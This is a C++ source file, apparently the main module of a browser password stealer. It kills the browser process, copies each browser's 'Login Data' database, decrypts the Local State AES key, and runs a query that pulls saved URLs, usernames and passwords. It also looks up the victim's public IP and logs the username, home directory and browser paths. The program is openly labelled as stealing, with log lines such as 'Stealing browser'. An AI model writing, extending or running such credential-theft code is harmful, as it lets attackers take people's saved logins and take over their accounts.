#include "../ext/includes.h"

//curl callback
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userData) {
    size_t totalSize = size * nmemb;
    userData->append((char*)contents, totalSize);
    return totalSize;
}

// Function to read file with UTF-8 encoding --TY CHAT GPT
std::string read_file_utf8(const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary); // Open in binary mode
    if (!file) {
        logger::log(logger::error, "Error opening file.");
        //we have to return a string. so just return an empty one on failure 
        return "";
    }

    // Read file content into a vector of chars
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    // Convert the vector of chars to a UTF-8 string
    return std::string(buffer.begin(), buffer.end());
}

//Get current public IP address using curl and ipify.org
std::string get_ip() {
    //setup curl
    CURL* curl = curl_easy_init();
    CURLcode res;
    std::string return_ip;

    //define what to do
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "http://api.ipify.org/");  // Set the URL
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);   // Set callback function
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &return_ip);         // Pass string to store response

        //perform action (send request)
        res = curl_easy_perform(curl);

        //log errors if any.
        if (res != CURLE_OK) {
            logger::log(logger::error, "Some error occured: %s", curl_easy_strerror(res));
        }


        //ALWAYS CLEANUP!
        curl_easy_cleanup(curl);
    }
    else {
        printf("curl no worky. \n");
    }
    //return public IP for later use. (LOL)
    return return_ip;

}


void log_info() {
    logger::log(logger::info, "IP: %s ", definitions::ip.c_str());
    logger::log(logger::info, "Username: %s", definitions::username.c_str());
    logger::log(logger::info, "home directory: %s ", definitions::home.c_str());
    logger::log(logger::info, "browser directory: %s ", definitions::browser.c_str());
    logger::log(logger::info, "local state file: %s ", definitions::localstate_path.c_str());
}

int main() {
    definitions::initialize();
    kill_browser(definitions::browser_proccess);

    for (const auto& [browser_Name, browser_Path] : definitions::browser_paths) {
        logger::log(logger::info, "Stealing browser: %s", browser_Name.c_str());
        definitions::browser = browser_Path;
        definitions::localstate_path = browser_Path + "Local State";

        // Check if Local State exists.
        if (!std::filesystem::exists(definitions::localstate_path)) {
            logger::log(logger::error, "Local State file does not exist for browser: %s", browser_Name.c_str());
            continue; // if not, go to next browser.
        }

        // read local state
        definitions::localstate_content = read_file_utf8(definitions::localstate_path);
        if (definitions::localstate_content.empty()) {
            logger::log(logger::error, "Failed to read Local State file for browser: %s", browser_Name.c_str());
            continue; // go to next browser.
        }

        try {
            // check if the DB exists before stealing.
            if (!std::filesystem::exists(definitions::browser + "Default\\Login Data")) {
                logger::log(logger::error, "Login Data file does not exist for browser: %s", browser_Name.c_str());
                continue; // go to next browser.
            }

            steal_db(definitions::browser + "Default\\Login Data");

            get_ip();

            // parse and validate local state json.
            json localstate_json = read_local_state();
            if (localstate_json.empty()) {
                logger::log(logger::error, "Failed to parse Local State JSON for browser: %s", browser_Name.c_str());
                continue; // go to next browser.
            }

            check_json(localstate_json);

            // Use AES key to decrypt
            std::vector<BYTE> aeskey = decrypt_utils::decode_key(definitions::encoded_key_str);
            std::string dbPath = definitions::browser + "Default\\Login Data.db";
            if (std::filesystem::exists(dbPath)) {
                retrieve_DB(dbPath, "SELECT origin_url, username_value, password_value FROM LOGINS", aeskey);
            }
            else {
                logger::log(logger::error, "Database file does not exist: %s", dbPath.c_str());
            }
        }
        catch (const std::exception& e) {
            logger::log(logger::error, "An error occurred for browser %s: %s", browser_Name.c_str(), e.what());
        }
    }


    log_info();
    std::cin.get();
    return 0;
}
